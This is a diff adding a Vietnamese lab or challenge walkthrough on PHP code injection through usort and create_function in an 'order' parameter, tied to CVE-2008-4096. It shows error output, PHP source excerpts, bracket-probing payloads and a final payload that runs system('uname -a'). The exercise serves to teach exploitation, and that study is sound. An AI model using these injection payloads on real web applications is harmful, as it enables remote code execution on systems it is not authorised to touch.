@@ -1,0 +1,51 @@
+Khi đặt mua thông tin, các nhà phát triển có thể sử dụng hai phương pháp:
+
+    đặt hàng theo yêu cầu SQL;
+    sử dụng trong mã PHP.
+
+
+Hàm usort thường được sử dụng với hàm create_ functions để tạo động hàm "sorting", 
+dựa trên thông tin do người dùng kiểm soát. 
+Nếu ứng dụng web thiếu tính năng lọc và xác thực mạnh, điều này có thể dẫn đến việc thực thi mã.
+
+Bằng cách đưa vào một câu trích dẫn duy nhất, chúng ta có thể biết được điều gì đang xảy ra:
+
+          Parse error: syntax error, unexpected '',$b->id'' (T_CONSTANT_ENCAPSED_STRING) in /var/www/index.php(29) : 
+          runtime-created function on line 1
+
+          Warning: usort() expects parameter 2 to be a valid callback, no array or string given in /var/www/index.php
+          on line 29
+
+Mã nguồn của hàm trông giống như sau:
+
+          ZEND_FUNCTION(create_function)
+          {
+            [...]
+            eval_code = (char *) emalloc(eval_code_length);
+            sprintf(eval_code, "function " LAMBDA_TEMP_FUNCNAME "(%s){%s}", Z_STRVAL_PP(z_function_args), Z_STRVAL_PP(z_function_code));
+
+            eval_name = zend_make_compiled_string_description("runtime-created function" TSRMLS_CC);
+            retval = zend_eval_string(eval_code, NULL, eval_name TSRMLS_CC);
+            [...]
+            
+            
+            
+ Chúng ta có thể thấy rằng mã sẽ được đánh giá được đặt bên trong dấu ngoặc nhọn {...} và 
+ chúng ta sẽ cần thông tin này để hoàn thành cú pháp một cách chính xác, sau khi chèn.
+
+Trái ngược với lần chèn mã trước đó, 
+ở đây, bạn không tiêm vào bên trong dấu ngoặc kép hoặc đơn. 
+Chúng tôi biết rằng chúng tôi cần đóng câu lệnh với } và nhận xét phần còn lại của mã bằng cách sử dụng // hoặc # (với mã hóa). 
+
+Chúng ta có thể thử xem xét xung quanh bằng:
+    ?order=id;}// chúng tôi nhận được thông báo lỗi (Parse error: syntax error, unexpected ';'). Chúng tôi có thể thiếu một hoặc nhiều dấu ngoặc.
+    ?order=id);}// chúng tôi nhận được một cảnh báo. Điều đó có vẻ đúng.
+    ?order=id));}// chúng tôi nhận được thông báo lỗi (Parse error: syntax error, unexpected ')' i). Chúng ta có thể có quá nhiều dấu ngoặc kép.
+    
+    
+Vì bây giờ chúng ta đã biết cách hoàn thành mã một cách chính xác 
+(cảnh báo không dừng quá trình thực thi), chúng ta có thể chèn mã tùy ý và thực thi mã đạt được bằng cách sử dụng:
+?order=id);}system('uname%20-a');//
+
+Thử thách này dựa trên một lỗ hổng trong PHPMyAdmin: CVE-2008-4096    
+           
